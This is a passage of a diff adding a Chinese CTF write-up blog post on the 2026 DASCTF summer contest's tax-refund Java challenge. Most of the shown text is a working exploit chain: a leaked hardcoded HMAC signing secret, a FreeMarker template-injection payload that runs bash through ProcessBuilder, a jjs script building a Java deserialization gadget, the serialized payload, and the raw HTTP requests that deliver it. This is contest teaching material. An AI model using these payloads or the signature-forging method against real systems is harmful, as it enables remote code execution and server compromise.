this.refundRepository.save(req);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过<code>attachmentData</code>参数传入</p>
+<p>跟进<code>approveRefund</code></p>
+<p><img src="/mdimg/2026DASCTF/1780240293418-1d7d5d1c-049c-4dbe-a429-1f417f38754d.png" srcset="/img/loading.gif" lazyload></p>
+<p>com.tax.controller.ReviewController</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plain">@PostMapping(&#123;&quot;/api/review&quot;&#125;)<br>public Map&lt;String, Object&gt; reviewRefund(@RequestBody Map&lt;String, Object&gt; body, @RequestHeader(value = &quot;X-Signature&quot;, defaultValue = &quot;&quot;) String signature, HttpSession session) &#123;<br>    Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();<br>    String role = (String) session.getAttribute(&quot;role&quot;);<br>    if (!&quot;reviewer&quot;.equals(role) &amp;&amp; !&quot;admin&quot;.equals(role)) &#123;<br>        result.put(&quot;success&quot;, false);<br>        result.put(&quot;message&quot;, &quot;Access denied: reviewer privileges required&quot;);<br>        return result;<br>    &#125;<br>    try &#123;<br>        Long refundId = Long.valueOf(Long.parseLong(body.get(&quot;refundId&quot;).toString()));<br>        String action = (String) body.getOrDefault(&quot;action&quot;, &quot;&quot;);<br>        String attachmentData = (String) body.getOrDefault(&quot;attachmentData&quot;, &quot;&quot;);<br>        if (!attachmentData.isEmpty() &amp;&amp; !verifySignature(attachmentData, signature)) &#123;<br>            result.put(&quot;success&quot;, false);<br>            result.put(&quot;message&quot;, &quot;Invalid attachment signature. Upload rejected.&quot;);<br>            return result;<br>        &#125;<br>        if (&quot;approve&quot;.equals(action)) &#123;<br>            RefundRequest req = this.refundService.approveRefund(refundId, attachmentData);<br>            if (req == null) &#123;<br>                result.put(&quot;success&quot;, false);<br>                result.put(&quot;message&quot;, &quot;Refund not found or already processed&quot;);<br>                return result;<br>            &#125;<br>            result.put(&quot;success&quot;, true);<br>            result.put(&quot;message&quot;, &quot;Refund approved&quot;);<br>            result.put(&quot;refundId&quot;, req.getId());<br>        &#125; else if (&quot;reject&quot;.equals(action)) &#123;<br>            if (this.refundService.rejectRefund(refundId) == null) &#123;<br>                result.put(&quot;success&quot;, false);<br>                result.put(&quot;message&quot;, &quot;Refund not found or already processed&quot;);<br>                return result;<br>            &#125;<br>            result.put(&quot;success&quot;, true);<br>            result.put(&quot;message&quot;, &quot;Refund rejected&quot;);<br>        &#125; else &#123;<br>            result.put(&quot;success&quot;, false);<br>            result.put(&quot;message&quot;, &quot;Invalid action&quot;);<br>        &#125;<br>        return result;<br>    &#125; catch (Exception e) &#123;<br>        result.put(&quot;success&quot;, false);<br>        result.put(&quot;message&quot;, &quot;Invalid refund ID&quot;);<br>        return result;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><code>attachmentData</code>来自<code>/api/review</code>接口请求的body</p>
+<p>这个接口除了验证role为reviewer，还调用了<code>verifySignature</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">private boolean verifySignature(String data, String signature) &#123;<br>    if (data == null || signature == null || signature.isEmpty()) &#123;<br>        return false;<br>    &#125;<br>    try &#123;<br>        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);<br>        SecretKeySpec secretKeySpec = new SecretKeySpec(this.secretKey.getBytes(), &quot;HmacSHA256&quot;);<br>        mac.init(secretKeySpec);<br>        byte[] hash = mac.doFinal(data.getBytes());<br>        String expectedSig = Base64.getEncoder().encodeToString(hash);<br>        return expectedSig.equals(signature);<br>    &#125; catch (Exception e) &#123;<br>        return false;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>api.signing.secret硬编码在BOOT-INF/classes/application.properties</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">api.signing.secret=TaxManager_Secret_K3y_2026_Un1que<br></code></pre></td></tr></table></figure>
+
+<p>ssti payload，waf还会检测flag的内容，所以要base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;#assign ex=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;<br>&lt;#assign pb=ex(&quot;java.lang.ProcessBuilder&quot;,[&quot;bash&quot;,&quot;-c&quot;,&quot;cat /f* 2&gt;/dev/null | base64 &gt; /tmp/b64&quot;])&gt;<br>&lt;#assign proc=pb.start()&gt;<br>&lt;#assign rc=proc.waitFor()&gt;<br>$&#123;rc&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>gen_payload.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> <span class="hljs-title class_">ByteArrayOutputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">ObjectOutputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.io.ObjectOutputStream&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Base64</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">PdfReportGenerator</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;com.tax.report.PdfReportGenerator&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">ReportJob</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;com.tax.job.ReportJob&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">ScheduledTaskHandler</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;com.tax.util.ScheduledTaskHandler&quot;</span>);<br><br><span class="hljs-keyword">var</span> ssti = <span class="hljs-string">&#x27;&lt;#assign ex=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;#assign pb=ex(&quot;java.lang.ProcessBuilder&quot;,[&quot;bash&quot;,&quot;-c&quot;,&quot;cat /f* 2&gt;/dev/null | base64 &gt; /tmp/b64&quot;])&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;#assign proc=pb.start()&gt;&lt;#assign rc=proc.waitFor()&gt;$&#123;rc&#125;&#x27;</span>;<br><br><span class="hljs-comment">// 创建Gadget链对象</span><br><span class="hljs-keyword">var</span> pdfGen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfReportGenerator</span>(<span class="hljs-string">&quot;pdf&quot;</span>);<br><span class="hljs-keyword">var</span> reportJob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportJob</span>(pdfGen, ssti);<br><span class="hljs-keyword">var</span> handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScheduledTaskHandler</span>();<br><br><span class="hljs-comment">// 通过反射将ReportJob注入到taskQueue中</span><br><span class="hljs-keyword">var</span> taskQueueField = <span class="hljs-title class_">ScheduledTaskHandler</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;taskQueue&quot;</span>);<br>taskQueueField.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">var</span> taskQueue = taskQueueField.<span class="hljs-title function_">get</span>(handler);<br>taskQueue.<span class="hljs-title function_">add</span>(reportJob);<br><br><span class="hljs-comment">// 序列化为base64</span><br><span class="hljs-keyword">var</span> baos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-keyword">var</span> oos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.<span class="hljs-title function_">writeObject</span>(handler);<br>oos.<span class="hljs-title function_">close</span>();<br><span class="hljs-keyword">var</span> payloadB64 = <span class="hljs-title class_">Base64</span>.<span class="hljs-title function_">getEncoder</span>().<span class="hljs-title function_">encodeToString</span>(baos.<span class="hljs-title function_">toByteArray</span>());<br><span class="hljs-title function_">print</span>(payloadB64);<br></code></pre></td></tr></table></figure>
+
+<p>执行时需要将应用的类加入classpath：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 从JAR中提取类文件</span><br>unzip -o taxmanager-1.1.0-ctf.jar <span class="hljs-string">&#x27;BOOT-INF/classes/com/tax/**&#x27;</span> <span class="hljs-string">&#x27;BOOT-INF/lib/*.jar&#x27;</span><br><br><span class="hljs-comment"># 使用jjs执行，classpath包含应用类和所有依赖</span><br>CP=<span class="hljs-string">&quot;BOOT-INF/classes&quot;</span><br><span class="hljs-keyword">for</span> jar <span class="hljs-keyword">in</span> BOOT-INF/lib/*.jar; <span class="hljs-keyword">do</span> CP=<span class="hljs-string">&quot;<span class="hljs-variable">$CP</span>:<span class="hljs-variable">$jar</span>&quot;</span>; <span class="hljs-keyword">done</span><br>/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;<span class="hljs-variable">$CP</span>&quot;</span> gen_payload.js<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">rO0ABXNyACFjb20udGF4LnV0aWwuU2NoZWR1bGVkVGFza0hhbmRsZXIAAAAAAAAAAQIAAUwACXRhc2tRdWV1ZXQAEUxqYXZhL3V0aWwvUXVldWU7eHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAABc3IAFWNvbS50YXguam9iLlJlcG9ydEpvYgAAAAAAAAABAgACTAAJZ2VuZXJhdG9ydAAjTGNvbS90YXgvcmVwb3J0L1BkZlJlcG9ydEdlbmVyYXRvcjtMAA90ZW1wbGF0ZUNvbnRlbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyACFjb20udGF4LnJlcG9ydC5QZGZSZXBvcnRHZW5lcmF0b3IAAAAAAAAAAQIAAUwADHJlcG9ydEZvcm1hdHEAfgAHeHB0AANwZGZ0AN48I2Fzc2lnbiBleD0iZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5Lk9iamVjdENvbnN0cnVjdG9yIj9uZXcoKT48I2Fzc2lnbiBwYj1leCgiamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIixbImJhc2giLCItYyIsImNhdCAvZiogMj4vZGV2L251bGwgfCBiYXNlNjQgPiAvdG1wL2I2NCJdKT48I2Fzc2lnbiBwcm9jPXBiLnN0YXJ0KCk+PCNhc3NpZ24gcmM9cHJvYy53YWl0Rm9yKCk+JHtyY314<br></code></pre></td></tr></table></figure>
+
+<p>使用获取到的密钥对payload进行HMAC-SHA256签名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hmac, hashlib, base64<br><br>secret = <span class="hljs-string">&quot;TaxManager_Secret_K3y_2026_Un1que&quot;</span><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.b64&quot;</span>).read().strip()<br>signature = base64.b64encode(<br>    hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()<br>).decode()<br><span class="hljs-built_in">print</span>(signature)<br><span class="hljs-comment"># 签名结果: m+3zjpH2nhXWeV+dl23iUCoOSwEOnejzgynDO/8aai8=</span><br></code></pre></td></tr></table></figure>
+
+<p>创建退税申请</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /api/refund/apply HTTP/<span class="hljs-number">1.1</span><br>Host: 9f3b28f5.http-ctf2.dasctf.com<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Referer: http://9f3b28f5.http-ctf2.dasctf.com/apply</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Origin: http://9f3b28f5.http-ctf2.dasctf.com</span><br><span class="hljs-comment">Cookie: JSESSIONID=5261F15DDC8C510A9A5461D1224712E9</span><br><span class="hljs-comment">Content-Type: application/json</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#123;&quot;amount&quot;:1,&quot;taxYear&quot;:2025,&quot;reason&quot;:&quot;1&quot;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780245226249-240f31c6-517b-4e56-ae75-6176e86e7965.png" srcset="/img/loading.gif" lazyload></p>
+<p>提交审核请求，将恶意payload作为attachmentData，并带上X-Signature头</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /api/review HTTP/<span class="hljs-number">1.1</span><br>Host: 9f3b28f5.http-ctf2.dasctf.com<br>Accept: */*<br>Referer: http://9f3b28f5.http-ctf2.dasctf.com/apply<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Origin: http://9f3b28f5.http-ctf2.dasctf.com<br>Cookie: JSESSIONID=5261F15DDC8C510A9A5461D1224712E9<br>Content-<span class="hljs-type">Type</span>: application/json<br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">148.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>X-Signature: m+3zjpH2nhXWeV+dl23iUCoOSwEOnejzgynDO/8aai8=<br>Content-Length: <span class="hljs-number">40</span><br><br>&#123;<span class="hljs-string">&quot;refundId&quot;</span>:<span class="hljs-number">28</span>,<span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;approve&quot;</span>,<span class="hljs-string">&quot;attachmentData&quot;</span>:<span class="hljs-string">&quot;rO0ABXNyACFjb20udGF4LnV0aWwuU2NoZWR1bGVkVGFza0hhbmRsZXIAAAAAAAAAAQIAAUwACXRhc2tRdWV1ZXQAEUxqYXZhL3V0aWwvUXVldWU7eHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAABc3IAFWNvbS50YXguam9iLlJlcG9ydEpvYgAAAAAAAAABAgACTAAJZ2VuZXJhdG9ydAAjTGNvbS90YXgvcmVwb3J0L1BkZlJlcG9ydEdlbmVyYXRvcjtMAA90ZW1wbGF0ZUNvbnRlbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyACFjb20udGF4LnJlcG9ydC5QZGZSZXBvcnRHZW5lcmF0b3IAAAAAAAAAAQIAAUwADHJlcG9ydEZvcm1hdHEAfgAHeHB0AANwZGZ0AN48I2Fzc2lnbiBleD0iZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5Lk9iamVjdENvbnN0cnVjdG9yIj9uZXcoKT48I2Fzc2lnbiBwYj1leCgiamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIixbImJhc2giLCItYyIsImNhdCAvZiogMj4vZGV2L251bGwgfCBiYXNlNjQgPiAvdG1wL2I2NCJdKT48I2Fzc2lnbiBwcm9jPXBiLnN0YXJ0KCk+PCNhc3NpZ24gcmM9cHJvYy53YWl0Rm9yKCk+JHtyY314&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780245132402-587c9ff0-2649-41c4-9dce-71aef46e7ceb.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时恶意payload已作为voucherData存储在数据库中</p>
+<p>导出接口使用两步验证：先prepare获取token，再generate使用token</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /api/export/prepare HTTP/<span class="hljs-number">1.1</span><br>Host: 9f3b28f5.http-ctf2.dasctf.com<br>Accept: */*<br>Referer: http://9f3b28f5.http-ctf2.dasctf.com/apply<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Origin: http://9f3b28f5.http-ctf2.dasctf.com<br>Cookie: JSESSIONID=5261F15DDC8C510A9A5461D1224712E9<br>Content-<span class="hljs-type">Type</span>: application/json<br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">148.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Content-Length: <span class="hljs-number">40</span><br><br>&#123;<span class="hljs-string">&quot;refundId&quot;</span>:<span class="hljs-number">28</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780245161752-408503b6-e018-44f2-be1a-2578cabda9a2.png" srcset="/img/loading.gif" lazyload></p>
+<p>导出触发反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /api/export/generate HTTP/<span class="hljs-number">1.1</span><br>Host: 9f3b28f5.http-ctf2.dasctf.com<br>Accept: */*<br>Referer: http://9f3b28f5.http-ctf2.dasctf.com/apply<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Origin: http://9f3b28f5.http-ctf2.dasctf.com<br>Cookie: JSESSIONID=5261F15DDC8C510A9A5461D1224712E9<br>Content-<span class="hljs-type">Type</span>: application/json<br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">148.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Content-Length: <span class="hljs-number">40</span><br><br>&#123;<span class="hljs-string">&quot;refundId&quot;</span>:<span class="hljs-number">28</span>,<span class="hljs-string">&quot;exportToken&quot;</span>:<span class="hljs-string">&quot;7a705d16-90a9-419e-8d54-3b16bc1df928&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780245100728-f821c461-f981-491b-9170-87efc65c0532.png" srcset="/img/loading.gif" lazyload></p>
+<p>xxe读flag</p>
+<p><img src="/mdimg/2026DASCTF/1780245345704-ffb21885-be63-46a6-a64f-9c1eb7342b58.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E6%AF%94%E8%B5%9BWrite-Up/" class="category-chain-item">比赛Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9BWrite-Up/" class="print-no-link">#比赛Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2026DASCTF夏季赛</div>
+      <div>http://example.com/2026/06/01/2026DASCTF夏季赛/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年6月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/22/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%20CCSSSC%202026%20%E5%8D%8E%E5%8D%97%E5%8C%BA%E5%9F%9F%E8%B5%9B%20%20pth_attack/" title="第十九届软件系统安全赛CCSSSC2026华南区域赛  pth_attack">
+                        <span class="hidden-mobile">第十九届软件系统安全赛CCSSSC2026华南区域赛  pth_attack</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
